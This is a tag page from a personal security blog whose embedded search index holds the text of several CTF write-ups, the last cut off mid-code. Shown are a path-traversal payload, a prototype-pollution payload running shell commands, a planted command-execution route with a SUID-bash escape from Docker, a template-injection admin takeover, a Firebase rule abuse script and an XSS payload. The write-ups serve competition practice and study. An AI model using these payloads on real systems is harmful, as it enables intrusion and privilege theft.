<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Dynamic Linker">

    <link rel="alternate" type="application/rss+xml" href="https://sy1.sh/tags/dynamic-linker/index.xml" title="GeoCities - New Page (35) (or syls boring website)" />
    
        <title>Dynamic Linker | GeoCities - New Page (35) (or syls boring website)</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.dd7f4d768263b31dca99ccfd082ebb2574963449605bddaf5e9b91272f83dff2.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/"><u>H</u>ome</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/about"><u>A</u>bout</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/writeups"><u>W</u>riteups</a></li>
            
          </ul>
        </nav>
        


<h1>Dynamic Linker</h1>
<ul class="post-list">
    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Oct 4, 2022</span>
      
      <a class="bold-post-in-list" href="/posts/2022-10-04-dynamic-linker-hijacking-experiments-2/"
        >Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Oct 2, 2022</span>
      
      <a class="bold-post-in-list" href="/posts/2022-10-02-dynamic-linker-hijacking-experiments/"
        >Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)</a
      >
      
    </div>

</li>



    
  </ul>


<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https:
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "https:\/\/sy1.sh\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/posts\/"
    },
    
    "https:\/\/sy1.sh\/": {
        "title": "",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/"
    },
    
    "https:\/\/sy1.sh\/tags\/ctf\/": {
        "title": "ctf",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/ctf\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/": {
        "title": "CTF Writeups",
        "tags": ["writeups","ctf",],
        "content": "I\u0026rsquo;ve achieved some of my writeups since that there are a lot of them, with a lot of images and I just don\u0026rsquo;t have the time to port them all. Here is a comperhensive list of the writeups:\nYou can find them here: https://github.com/syrull/writeups ", 
        "url": "https:\/\/sy1.sh\/writeups\/"
    },
    
    "https:\/\/sy1.sh\/tags\/lfi\/": {
        "title": "lfi",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/lfi\/"
    },
    
    "https:\/\/sy1.sh\/tags\/php\/": {
        "title": "php",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/php\/"
    },
    
    "https:\/\/sy1.sh\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/"
    },
    
    "https:\/\/sy1.sh\/tags\/writeups\/": {
        "title": "writeups",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/writeups\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/zer0pts-ctf-2022-gitfile-explorer\/": {
        "title": "zer0pts CTF 2023 - GitFile Explorer",
        "tags": ["writeups","ctf","php","lfi",],
        "content": "This is a single PHP file challenge that contains a \u0026ldquo;Git File Explorer\u0026rdquo;, it basically fetches a file from github/gitlab/bitbucket that you specify in the form. The challenge here is to read /flag at the root.\nI went through the code to see how we can possibly read the flag, and the only way it seem to be out of this snippet:\nif ($service) { $url = craft_url($service, $owner, $repo, $branch, $file); if (preg_match(\u0026#34;/^http.+\\/\\/.*(github|gitlab|bitbucket)/m\u0026#34;, $url) === 1) { $result = file_get_contents($url); } } It uses file_get_contents via a provided URL, the URL is constructed by the function craft_url.\nfunction craft_url($service, $owner, $repo, $branch, $file) { if (strpos($service, \u0026#34;github\u0026#34;) !== false) { /* GitHub URL */ return $service.\u0026#34;/\u0026#34;.$owner.\u0026#34;/\u0026#34;.$repo.\u0026#34;/\u0026#34;.$branch.\u0026#34;/\u0026#34;.$file; } else if (strpos($service, \u0026#34;gitlab\u0026#34;) !== false) { /* GitLab URL */ return $service.\u0026#34;/\u0026#34;.$owner.\u0026#34;/\u0026#34;.$repo.\u0026#34;/-/raw/\u0026#34;.$branch.\u0026#34;/\u0026#34;.$file; } else if (strpos($service, \u0026#34;bitbucket\u0026#34;) !== false) { /* BitBucket URL */ return $service.\u0026#34;/\u0026#34;.$owner.\u0026#34;/\u0026#34;.$repo.\u0026#34;/raw/\u0026#34;.$branch.\u0026#34;/\u0026#34;.$file; } return null; } Now lets figure out a way to bypass the first strpos matching. So first of all this function does not care where it sees the string it simply return true if it sees it somewhere, so that\u0026rsquo;s good to know lets go the regex that we need to bypass somehow.\nSo the regex seems a bit off, I spotted two things at first, the /m which means multiline (ends up completely random and not related to the challenge) and that it doesn\u0026rsquo;t enforce a column after http, which makes it easy to request a local file. Lets try to do that.\nI\u0026rsquo;ve put some echos here and there so that I can see if it bypasses it with the following payload:\n/?service=https//github And it does\n[Tue Nov 12 09:43:14 2024] PHP Warning: file_get_contents(https//github/ptr-yudai/ptrlib/master/README.md): Failed to open stream: No such file or directory in /home/.\u0026lt;\u0026gt;./gitfile-explorer/index.php on line 33 I can see that it tries to open the folder https in the current dir and so on, the problem is that it attaches the default settings of the other attributes, so we must use them as well. After a bit trial and error I\u0026rsquo;ve come up with this payload:\n/?service=https//github\u0026amp;owner=..\u0026amp;repo=..\u0026amp;branch=..\u0026amp;file=../../../../../flag Which reads the flag:\nzer0pts{foo/bar/../../../../../directory/traversal} ", 
        "url": "https:\/\/sy1.sh\/writeups\/zer0pts-ctf-2022-gitfile-explorer\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/htb-challenge-gunship\/": {
        "title": "HTB Challenge - Gunship",
        "tags": ["writeups","ctf","prototype pollution","js",],
        "content": "This is a prototype pollution challenge as I realized by having pinned packages such as \u0026quot;flat\u0026quot;: \u0026quot;5.0.0\u0026quot;, we then can see the vulnerability related to it which is this .\nSo the challenge starts with a simple submit input that takes an artist name and sends it to the backend.\nrouter.post(\u0026#39;/api/submit\u0026#39;, (req, res) =\u0026gt; { const { artist } = unflatten(req.body); if (artist.name.includes(\u0026#39;Haigh\u0026#39;) || artist.name.includes(\u0026#39;Westaway\u0026#39;) || artist.name.includes(\u0026#39;Gingell\u0026#39;)) { return res.json({ \u0026#39;response\u0026#39;: pug.compile(\u0026#39;span Hello #{user}, thank you for letting us know!\u0026#39;)( { user: \u0026#39;guest\u0026#39; } ) }); } else { return res.json({ \u0026#39;response\u0026#39;: \u0026#39;Please provide us with the full name of an existing member.\u0026#39; }); } }); Here we evaluate the req.body with the vulnerable unflatten, and we can pollute it. After a lot of trial and error I eventually realized that I need to use AST injection instead of this vulnerability that I couldn\u0026rsquo;t exploit .\nAfter reading some more I\u0026rsquo;ve polluted the block with the following payload:\n{ \u0026#34;artist.__proto__\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Haigh\u0026#34;, \u0026#34;block\u0026#34;: { \u0026#34;type\u0026#34;:\u0026#34;Text\u0026#34;, \u0026#34;line\u0026#34;: \u0026#34;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;cp /app/flag* /app/static/images/f\u0026#39;)\u0026#34; } } } Then we can access the flag visiting /static/images/f\nHTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!} ", 
        "url": "https:\/\/sy1.sh\/writeups\/htb-challenge-gunship\/"
    },
    
    "https:\/\/sy1.sh\/tags\/js\/": {
        "title": "js",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/js\/"
    },
    
    "https:\/\/sy1.sh\/tags\/prototype-pollution\/": {
        "title": "prototype pollution",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/prototype-pollution\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/4t-ctf-2024-homelab-more-like-pwnlab\/": {
        "title": "4T$ CTF 2024 - Homelab ? More like Pwnlab !",
        "tags": ["writeups","ctf","docker","privilege escalation","lfi",],
        "content": "We would start with 2 things:\n Web SSH Access (through the browser) Application with simple upload/download functionality  I found that the application does not enforce the paths for uploading and downloading and you can upload/download whatever file you want, you just have to URL encode it like so:\n..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd I\u0026rsquo;ve also realized that this application is running in a Docker container, by going through the web SSH, I can see the docker compose file in /home/admin/docker-compose.yml.\nIn the source code of the application I had an odd route called /restart this would restart the application, meaning that something is running and it is making sure that this application keeps running even if I exit the process (that\u0026rsquo;s what the /restart does). This likely hints that I need to change the application to gain RCE. So I\u0026rsquo;ve created another route called /execute and I\u0026rsquo;ve attached it to the app.js which looks like this:\napp.get(\u0026#39;/execute\u0026#39;, (req, res) =\u0026gt; { const command = req.query.cmd; // Get the command from the query string  if (!command) { return res.send(` \u0026lt;p\u0026gt;Please provide a command using the \u0026lt;code\u0026gt;?cmd=\u0026lt;/code\u0026gt; query string.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Example: \u0026lt;code\u0026gt;/execute?cmd=ls\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; `); } exec(command, (error, stdout, stderr) =\u0026gt; { if (error) { return res.send(` \u0026lt;p\u0026gt;\u0026lt;strong\u0026gt;Error:\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;pre\u0026gt;${error.message}\u0026lt;/pre\u0026gt; \u0026lt;p\u0026gt;Command: \u0026lt;code\u0026gt;${command}\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; `); } if (stderr) { return res.send(` \u0026lt;p\u0026gt;\u0026lt;strong\u0026gt;Stderr:\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;pre\u0026gt;${stderr}\u0026lt;/pre\u0026gt; \u0026lt;p\u0026gt;Command: \u0026lt;code\u0026gt;${command}\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; `); } res.send(` \u0026lt;p\u0026gt;\u0026lt;strong\u0026gt;Output:\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;pre\u0026gt;${stdout}\u0026lt;/pre\u0026gt; \u0026lt;p\u0026gt;Command: \u0026lt;code\u0026gt;${command}\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; `); }); }); Then I\u0026rsquo;ve URL encoded it with CyberChief, and uploaded the file to this path: ..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fcwd%2Fapp.js, then I restarted the application using the /restart route.\nAfter that the route should be available to us, and I can execute arbitrary commands like: /execute?cmd=ls\nDockerfile app.js entrypoint.sh node_modules package-lock.json package.json public views Now earlier docker-compose file (/home/admin/docker-compose.yml) which looks like this:\nservices: webapp: image: webapp ports: \u0026#34;8080:5555\u0026#34; volumes: /home/user/nas_storage:/app/public/uploads I can see that the container\u0026rsquo;s path /app/public/uploads is mapped to /home/user/nas_storage path on the main server which I got web SSH access to, now here are the steps of how to privilege escalate to root:\n On the web SSH, copy the bash binary to the /home/user/nas_storage/ On the docker container, make the bash binary owned by root and set SUID (u+s). On the web SSH invoke the bash binary with -p  And you should be root. Now you can read the flag located in /home/admin/flag\n4T${pWnD_7h3_pwNl48??!} ", 
        "url": "https:\/\/sy1.sh\/writeups\/4t-ctf-2024-homelab-more-like-pwnlab\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/4t-ctf-2024-my-sky-blog\/": {
        "title": "4T$ CTF 2024 - My Sky Blog",
        "tags": ["writeups","ctf","Go","ssti",],
        "content": "We start with a simple blog website. We can create an account and login, upon logging in we are greeted with a random greeting and we have couple of options:\n Create a post Change Username/Password  After few black-box testing here for XSS, I\u0026rsquo;ve found XSS on the /profile because the username wasn\u0026rsquo;t escaped, but that\u0026rsquo;s not the main vulnerability. I\u0026rsquo;ve downloaded the source code and I saw that its a Go project and the name of the module is module ssti which hints for SSTI (Server Side Template Injection).\nThe vulnerability is within the template profile.html\n\u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;username\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;{{.User.Username}}\u0026#34; /\u0026gt; Which contains the set of the current user\u0026rsquo;s username. Now we can simply specify {{ .User.Password }} and we would get the hashed password for our user.\nHowever, we need to become an admin so that we can access the /flag route. And the thing that the profile is rendering is the Session object which looks like this:\ntype Session struct { // Private fields \tusers []*User id string // Public fields \tUser *User Posts []*Post NbPosts int HasError bool Error string CoolSentence string } Now we cannot simply grab the session id and replace it because those are not exported/public (lowercase letters). And we also cannot set ourselves to become admin because the option within User.isAdmin is also not exported. However when we check the Post model we would see the Author which is exported, and we also have an empty session from the admin containing 1 post which we can see in sessions.go:\nfunc CreateEmptySession() *Session { admin := \u0026amp;User{ isAdmin: true, Username: \u0026#34;admin\u0026#34;, } // Get a random password \trandomPassword := uuid.New().String() admin.ChangePassword(randomPassword) id := uuid.New().String() return \u0026amp;Session{ users: []*User{ admin, }, id: id, User: nil, Posts: []*Post{ { Author: admin, Title: \u0026#34;Welcome to my beautiful Sky Blog!\u0026#34;, Body: \u0026#34;I welcome you to my blog, where I\u0026#39;ll post about my adventures in the sky !\u0026#34;, UpdatedAt: time.Date(2024, 5, 1, 12, 54, 30, 20, time.UTC), }, }, NbPosts: 1, } } So that basically means that we can access the admin\u0026rsquo;s user by using the Post model. The Post model is an array, so lets get the first element of the array and chain it with Author. In this way we would get the Admin\u0026rsquo;s user. But we need to somehow get its password or better, change it..\nWe have an available function called ChangePassword which we can use with the Author, so lets chain all the things together. Go to the profile and change the username to:\n{{ (index .Posts 0).Author.ChangePassword \u0026quot;123\u0026quot; }} Refresh, logout and login with admin:123 and grab the flag.\n4T${w417_H0w_d1D_Y0u_d0_7h12} ", 
        "url": "https:\/\/sy1.sh\/writeups\/4t-ctf-2024-my-sky-blog\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/bluehensctf-2024-corkscrew\/": {
        "title": "BlueHensCTF 2024 - Corkscrew",
        "tags": ["writeups","ctf","cipher",],
        "content": "We start with a few hints and a string that we should rearrange. The hints are that this consists of a old school crypto and the string is Us_lnt10ns}1443{FTCDqsysp0srrr4up_t1.\nAfter consulting with my best friend chatgpt, it hinted me that this could be a Spiral-Like cipher. So it goes like this:\nThe text is 36 chars long and we can create a square shape out of it.\nU s _ l n t 1 0 n s } 1 4 4 3 { F T C D q s y s p 0 s r r r 4 u p _ t 1 Then we simply transpose it clockwise in a spiral way so that becomes\nU s _ l n t D q s y s 1 C u p _ p 0 T 4 q t 0 n F r r 1 s s { 3 4 4 1 } And each column contains the flag:\nUDCTF{squ4r3_sp1r4ly_tr4nsp0s1t10ns} ", 
        "url": "https:\/\/sy1.sh\/writeups\/bluehensctf-2024-corkscrew\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/bluehensctf-2024-firefun-3\/": {
        "title": "BlueHensCTF 2024 - Firefun 3",
        "tags": ["writeups","ctf","firebase","js",],
        "content": "We would start with a simple landing page that has nothing in it besides some HTML, the wappalyzer tells us that this is a Firebase application.\nIn that case we can try to fuzz some firebase specific things, which will lead us to the configuration file:\n/__/firebase/init.json Now we can quickly craft some enumeration of that application, HOWEVER I\u0026rsquo;ve tried with various tools such as:\n firepwn  baserunner   But for whatever reason they did not work, so I\u0026rsquo;ve crafted my own code to do the enumeration in NodeJS. First I wanted to explore the storage, where I found this file is_this_secure?.png. Which contains a screenshot of the rules which are:\n{ \u0026#34;rules\u0026#34;: { \u0026#34;users\u0026#34;: { \u0026#34;$userid\u0026#34;: { \u0026#34;.read\u0026#34;: \u0026#34;$userid === auth.uid\u0026#34;, \u0026#34;.write\u0026#34;: \u0026#34;$userid === auth.uid\u0026#34; } }, \u0026#34;rules\u0026#34;: { \u0026#34;.read\u0026#34;: true, \u0026#34;.write\u0026#34;: false }, \u0026#34;flag\u0026#34;: { \u0026#34;.write\u0026#34;: false, \u0026#34;.read\u0026#34;: \u0026#34;root.child(\u0026#39;users\u0026#39;).child(auth.uid).child(\u0026#39;roles\u0026#39;).child(\u0026#39;admin\u0026#39;).exists()\u0026#34; } } } We can see that we can uncover the flag node by being an admin. So let\u0026rsquo;s try to set ourselves as admin and get the flag.\nimport { initializeApp } from \u0026#34;firebase/app\u0026#34;; import { getAuth, signInWithEmailAndPassword } from \u0026#34;firebase/auth\u0026#34;; import { getDatabase, ref as dbref, update, get } from \u0026#34;firebase/database\u0026#34;; const app = initializeApp({ \u0026#34;apiKey\u0026#34;: \u0026#34;AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU\u0026#34;, \u0026#34;authDomain\u0026#34;: \u0026#34;udctf24.firebaseapp.com\u0026#34;, \u0026#34;databaseURL\u0026#34;: \u0026#34;https://udctf24-default-rtdb.firebaseio.com\u0026#34;, \u0026#34;messagingSenderId\u0026#34;: \u0026#34;926833250426\u0026#34;, \u0026#34;projectId\u0026#34;: \u0026#34;udctf24\u0026#34;, \u0026#34;storageBucket\u0026#34;: \u0026#34;udctf24.firebasestorage.app\u0026#34; }); // Initialize Database const db = getDatabase(app); // Authenticate and Assign Admin Role const auth = getAuth(); signInWithEmailAndPassword(auth, \u0026#34;wow@gmail.com\u0026#34;, \u0026#34;password\u0026#34;) .then((userCredential) =\u0026gt; { // User successfully signed in  const user = userCredential.user; console.log(\u0026#34;User logged in:\u0026#34;, user.email); const uid = user.uid; const userRolesRef = dbref(db, `users/${uid}/roles`); update(userRolesRef, { admin: true }) .then(() =\u0026gt; { console.log(\u0026#34;Admin role assigned to user:\u0026#34;, uid); const flagRef = dbref(db, \u0026#39;/flag\u0026#39;); get(flagRef) .then((snapshot) =\u0026gt; { if (snapshot.exists()) { console.log(\u0026#34;Flag data:\u0026#34;, snapshot.val()); } else { console.log(\u0026#34;No data available at /flag\u0026#34;); } }) .catch((error) =\u0026gt; { console.error(\u0026#34;Error reading /flag data:\u0026#34;, error); }); }) .catch((error) =\u0026gt; { console.error(\u0026#34;Error assigning admin role:\u0026#34;, error); }); }) .catch((error) =\u0026gt; { console.error(\u0026#34;Error signing in:\u0026#34;, error); }); Which get us the flag:\nudctf{wh4t_4_sleuth_y0u_4r3!} ", 
        "url": "https:\/\/sy1.sh\/writeups\/bluehensctf-2024-firefun-3\/"
    },
    
    "https:\/\/sy1.sh\/tags\/cipher\/": {
        "title": "cipher",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/cipher\/"
    },
    
    "https:\/\/sy1.sh\/tags\/docker\/": {
        "title": "docker",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/docker\/"
    },
    
    "https:\/\/sy1.sh\/tags\/firebase\/": {
        "title": "firebase",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/firebase\/"
    },
    
    "https:\/\/sy1.sh\/tags\/go\/": {
        "title": "Go",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/go\/"
    },
    
    "https:\/\/sy1.sh\/tags\/privilege-escalation\/": {
        "title": "privilege escalation",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/privilege-escalation\/"
    },
    
    "https:\/\/sy1.sh\/tags\/ssti\/": {
        "title": "ssti",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/ssti\/"
    },
    
    "https:\/\/sy1.sh\/tags\/xss\/": {
        "title": "xss",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/xss\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/zer0pts-ctf-2023-neko-note\/": {
        "title": "zer0pts CTF 2023 - Neko Note",
        "tags": ["writeups","ctf","js","xss","Go",],
        "content": "I spent way too much time on this challenge but it was a really good one. We would start with a simple web page that has a basic form that you ca use to create notes. The form consists of 3 things, title, body and \u0026hellip;a password?! The password part was odd but lets continue.. You can also specify a \u0026ldquo;link\u0026rdquo; to other note via the square brackets like [6f16cd75-c50d-4ea2-b845-a085ff982a57] that UUID would be the identifier of the other note that you wan to link, and the interesting part here is that it expands its title, so if you put that UUID in your body, whenever you request the note you would get a link with the note\u0026rsquo;s title.\nI\u0026rsquo;ve spent good amount of time playing with it, and I quickly found the XSS\u0026hellip;but not the one that I need to actually exploit that, I found the XSS in the success message, it was a bit misleading to me but I quickly realized that this is not the path whenever I looked in the source code.\nI glanced at the bot\u0026rsquo;s code to see where the flag is located and I saw that the flag is actually a note that the bot posts, and the other part is that the note is protected with a random password. So now we have 2 problems that we need to solve.\n How do I get the UUID of note that the bot has created? How do I get the password for it?  We can see that the bot does the following:\nawait page.type(\u0026#39;#title\u0026#39;, \u0026#39;Flag\u0026#39;); await page.type(\u0026#39;#body\u0026#39;, `The flag is: ${FLAG}`); const password = crypto.randomBytes(64).toString(\u0026#39;base64\u0026#39;); await page.type(\u0026#39;#password\u0026#39;, password); await page.click(\u0026#39;#submit\u0026#39;); // let\u0026#39;s check the reported note await page.goto(`${BASE_URL}/note/${id}`); if (await page.$(\u0026#39;input\u0026#39;) != null) { // the note is locked, so use master key to unlock \tawait page.type(\u0026#39;input\u0026#39;, MASTER_KEY); await page.click(\u0026#39;button\u0026#39;); // just in case there is a vuln like XSS, delete the password to prevent it from being stolen \tconst len = (await page.$eval(\u0026#39;input\u0026#39;, el =\u0026gt; el.value)).length; await page.focus(\u0026#39;input\u0026#39;); for (let i = 0; i \u0026lt; len; i++) { await page.keyboard.press(\u0026#39;Backspace\u0026#39;); } } // it\u0026#39;s ready now. click \u0026#34;Show the note\u0026#34; button await page.click(\u0026#39;button\u0026#39;); Now the interesting part is the await page.keyboard.press('Backspace'); that adds a bit more complexity but I am pretty sure that we can just use \u0026ldquo;undo\u0026rdquo; in execCommand#undo to solve this, but that for later. Let\u0026rsquo;s actually figure out how the notes are being handled.\nFirst off, let\u0026rsquo;s check what is the note creation workflow. We would issue a PUT request to /api/note/new, with multipart/form-data that looks like this:\nPUT /api/note/new HTTP/1.1 Host: google.com Content-Length: 366 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Valve Steam Client/default/1685488080)  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAathc2UBgTcyl0Js Accept: */* Origin: http://google.com/ Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://google.com/ Accept-Encoding: gzip, deflate, br, zstd Accept-Language: en-US,en;q=0.9 ------WebKitFormBoundaryAathc2UBgTcyl0Js Content-Disposition: form-data; name=\u0026#34;title\u0026#34; wh ------WebKitFormBoundaryAathc2UBgTcyl0Js Content-Disposition: form-data; name=\u0026#34;body\u0026#34; at the fuck ------WebKitFormBoundaryAathc2UBgTcyl0Js Content-Disposition: form-data; name=\u0026#34;password\u0026#34; (╯°□°)╯︵ ┻━┻ ------WebKitFormBoundaryAathc2UBgTcyl0Js-- Then this request goes to createNoteHandler that eventually returns the UUID of the note\n{ \u0026#34;id\u0026#34;: \u0026#34;9e7e4c5c-aa2c-44b0-a8aa-4a60d24b12a0\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;ok\u0026#34; } The showMessage function would give us the link to that note, and then when we click it the request would be handled by getNoteHandler. So let\u0026rsquo;s see how our note is getting rendered there.\nfunc getNoteHandler(c *gin.Context) { id := c.Param(\u0026#34;id\u0026#34;) if !uuidPattern.MatchString(id) { c.JSON(http.StatusBadRequest, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Given ID is not a UUID\u0026#34;, }) return } note, ok := notes[id] if !ok { c.JSON(http.StatusNotFound, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Note not found\u0026#34;, }) return } // if note is locked, body should not be sent \tif note.Locked { note.Body = \u0026#34;\u0026#34; } note.Body = renderNote(note.Body) c.JSON(http.StatusOK, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;ok\u0026#34;, \u0026#34;note\u0026#34;: note, }) } We first check if the id matches the regex UUID pattern, if everything is okay we would fetch the id from the map and render its body with the function renderNote, lets check how exactly.\nfunc renderNote(note string) string { note = html.EscapeString(note) note = strings.ReplaceAll(note, \u0026#34;\\n\u0026#34;, \u0026#34;\u0026lt;br\u0026gt;\u0026#34;) note = replaceLinks(note) return note } So we first, escape the note\u0026rsquo;s body then we replace the newlines with BRRrrr\u0026hellip; and then \u0026hellip;we replaceLinks? Let\u0026rsquo;s see how..\nfunc replaceLinks(note string) string { return linkPattern.ReplaceAllStringFunc(note, func(s string) string { id := strings.Trim(s, \u0026#34;[]\u0026#34;) note, ok := notes[id] if !ok { return s } title := html.EscapeString(note.Title) return fmt.Sprintf(\u0026#34;\u0026lt;a href=/note/%s title=%s\u0026gt;%s\u0026lt;/a\u0026gt;\u0026#34;, id, title, title,) }) } Okay, the first YELLOW bulb is here! I would admit that I didn\u0026rsquo;t spot it at first but the title=%s part is VERY odd, why would you need that\u0026hellip; UNLESS!\nSo let\u0026rsquo;s try to inject something and see how it acts.\nWe would first create a note with some payload, then we would copy the UUID of that note and then create another one with the link to that note, in that way we would reach the replaceLinks code and we would inject something in the title attribute.\nNow here I\u0026rsquo;ve began to struggle to inject anything, but I eventually found the XSS with some trial and error using XSS CheatSheet by PortSwigger I\u0026rsquo;ve choose the tag \u0026ldquo;a\u0026rdquo; and then began to see what works with it, until I\u0026rsquo;ve eventually found the grail called \u0026ldquo;onfocus autofocus tabindex=1\u0026rdquo;. With these extraordinary attributes I was able to trigger an alert.\nSo the payload that I\u0026rsquo;ve crafted is the following:\na onfocus=alert(1) autofocus tabindex=1 That triggers an alert whenever you click, \u0026ldquo;Show the Note\u0026rdquo;. Perfect, now we need to see how to extract the bot\u0026rsquo;s notes. Let\u0026rsquo;s check how they are stored.\nWe can see the JS function addHistory(); which apparently adds the notes in the local storage as JSON.\nfunction getHistory() { const res = localStorage.getItem(\u0026#39;neko-note-history\u0026#39;); if (res === null) { return []; } return JSON.parse(res); } function setHistory(hist) { localStorage.setItem(\u0026#39;neko-note-history\u0026#39;, JSON.stringify(hist)) } // NSA CODE not shown function addHistory(id, title) { let hist = getHistory(); hist.push({ id, 